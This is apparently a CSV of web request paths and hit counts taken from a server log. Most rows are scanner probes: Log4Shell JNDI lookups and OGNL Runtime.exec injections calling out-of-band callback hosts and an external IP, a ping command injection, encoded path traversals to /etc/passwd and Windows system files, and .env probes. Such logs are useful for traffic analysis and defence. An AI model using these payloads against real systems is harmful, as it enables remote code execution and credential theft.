path,count
/,49485
/!.env,6
/$%7Bjndi:ldap://81.181.248.148:1389/Exploit%7D,2
/$(ping${IFS}-c${IFS}6${IFS}2.59.132.84),1
/%20../web-inf/,1
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cqdu13tmb1a77vu32nd04m4nj6rn8qgrz.oast.me%22%29%7D/,1
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cqs4f0tmb1a1rjpoo51gt1seg9nrf8749.oast.fun%22%29%7D/,1
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cs1g6fdmb1a87cvbe6tg5zyk4zuznr1ui.oast.pro%22%29%7D/,2
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20csm3fu916vc0ketblhfgp4nkdfnxgpb5z.oast.me%22%29%7D/,1
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20ctv6p4hk546ne6s5bq80mgisa6mysjici.oast.online%22%29%7D/,1
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cunjo6rjkkn2sceeoin0ops55cnae6dc1.oast.online%22%29%7D/,1
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cv7v5vp9gkq686d3e3sgo6e5amxcxf1ic.oast.online%22%29%7D/,1
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cv9ahg99gkq0lodg4mb0zsa15mo8edyy7.oast.online%22%29%7D/,1
/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cvicm3p9gkq9ui02ecggx6utgbed58zou.oast.fun%22%29%7D/,1
/%255c%255cct553c916vc7v40lu5f01ruqwaa976bay.oast.online%255cC$%255cbb,1
/%2577eb%2575i_%2577sma_Http,17
/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,1
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/%2e%2e/%2e%2e/etc/passwd,4
/%2e/WEB-INF/web.xml,1
/%5C%5Cct553c916vc7v40lu5f0ioco3mo44ap74.oast.online/apachehttpd,1
/%5C../ssl/yaws-key.pem,1
/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,1
/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,1
/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%2fpasswd,1
/%C0,19
/%E7%94%9F%E6%B4%BB%E5%8F%B7%E5%8F%96%E5%85%B3_v1.0.0.apk,2
/%c0,1
